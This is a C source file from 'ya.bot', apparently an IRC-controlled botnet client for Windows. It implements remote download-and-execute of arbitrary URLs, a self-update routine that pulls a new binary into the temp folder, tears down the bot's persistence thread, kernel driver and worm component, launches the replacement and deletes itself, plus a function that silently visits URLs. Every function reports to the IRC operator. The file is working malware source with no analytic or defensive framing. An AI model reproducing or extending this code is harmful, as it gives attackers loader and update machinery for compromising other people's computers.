/*  ya.bot  */

#include "bot.h"

#ifndef NO_HTTP
DWORD WINAPI http_download(LPVOID param)
{
	SHTTPDownload s_hd = *((SHTTPDownload *)param);

#ifndef NO_DEBUG
		debug_print("[DEBUG] Downloading file, http_download()");
#endif

	if ((!s_hd.m_bSilent) && (s_hd.m_bVerbose))
			irc_message(s_hd.m_bsock, s_hd.m_szAction, s_hd.m_szDestination,
					(char *)string_httpdownloading,
					CBLUE, string_replyhttp, CEND, string_replydotbot,
					CBLUE, CEND, s_hd.m_szUrl);
	if (xURLDownloadToFile(s_hd.m_szUrl, s_hd.m_szFilePath) == S_OK)
	{
		if (s_hd.m_bRun)
				file_open(s_hd.m_szFilePath);
		if (!s_hd.m_bSilent)
				irc_message(s_hd.m_bsock, s_hd.m_szAction, s_hd.m_szDestination,
						(char *)string_httpdownloadedfile,
						CGREEN, string_replyhttp, CEND, string_replydotbot,
						CBLUE, CEND, s_hd.m_szUrl,
						CBLUE, CEND, s_hd.m_szFilePath,
						CBLUE, CEND, s_hd.m_bRun);
	}
	else
	{
		if ((!s_hd.m_bSilent) && (s_hd.m_bVerbose))
				irc_message(s_hd.m_bsock, s_hd.m_szAction, s_hd.m_szDestination,
						(char *)string_httpunabletodownload,
						CRED, string_replyhttp, CEND, string_replydotbot,
						CBLUE, CEND, s_hd.m_szUrl);
	}
		thread_remove(THREAD_HTTP);
		return 0;
}

DWORD WINAPI http_update(LPVOID param)
{
	char szFilePath[MAX_PATH], szTempDir[MAX_PATH];
	SHTTPDownload s_hd = *((SHTTPDownload *)param);

#ifndef NO_DEBUG
		debug_print("[DEBUG] Updating file, http_update()");
#endif

	if ((!s_hd.m_bSilent) && (s_hd.m_bVerbose))
			irc_message(s_hd.m_bsock, s_hd.m_szAction, s_hd.m_szDestination,
					(char *)string_httpdownloading,
					CBLUE, string_replyhttp, CEND, string_replydotbot,
					CBLUE, CEND, s_hd.m_szUrl);
		srand(GetTickCount());
		GetTempPath(sizeof(szTempDir) - 1, szTempDir);
		_snprintf(szFilePath, sizeof(szFilePath) - 1,
				(char *)string_httpupdatefile,
				szTempDir,
				rand() % 9999);
	if (xURLDownloadToFile(s_hd.m_szUrl, szFilePath) == S_OK)
	{
		if (!s_hd.m_bSilent)
				irc_message(s_hd.m_bsock, s_hd.m_szAction, s_hd.m_szDestination,
						(char *)string_httpdownloadedupdate,
						CGREEN, string_replyhttp, CEND, string_replydotbot,
						CBLUE, CEND, s_hd.m_szUrl,
						CBLUE, CEND, szFilePath);

#ifndef NO_INSTALLBOT
			if (uninstall_bot())
			{

#ifndef NO_PERSIST
					TerminateThread(g_hPersistThread, 0);
					CloseHandle(g_hPersistThread);
#endif

#ifndef NO_INSTALLDRIVER
					uninstall_driver();
#endif

#ifndef NO_INSTALLWORMRIDE
					uninstall_wormride();
#endif

					irc_action(s_hd.m_bsock, (char *)string_ircquit, (char *)string_botquitmsg);
					irc_disconnect(s_hd.m_bsock, s_hd.m_wsaEvent);
					process_start(szFilePath, FALSE);
					uninstall_botmelt();
					ExitProcess(0);
			}
#endif

	}
	if ((!s_hd.m_bSilent) && (s_hd.m_bVerbose))
			irc_message(s_hd.m_bsock, s_hd.m_szAction, s_hd.m_szDestination,
					(char *)string_httpunabletodownload,
					CRED, string_replyhttp, CEND, string_replydotbot,
					CBLUE, CEND, s_hd.m_szUrl);
		thread_remove(THREAD_HTTP);
		return 0;
}

bool http_visit(char *pszUrl)
{
	HINTERNET hInternet, hSession;
		hInternet = InternetOpen(string_httpagent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hInternet)
			return FALSE;
		hSession = InternetOpenUrl(hInternet, pszUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (!hSession)
	{
			InternetCloseHandle(hInternet);
			return FALSE;
	}
		InternetCloseHandle(hInternet);
		InternetCloseHandle(hSession);
		return TRUE;
}
#endif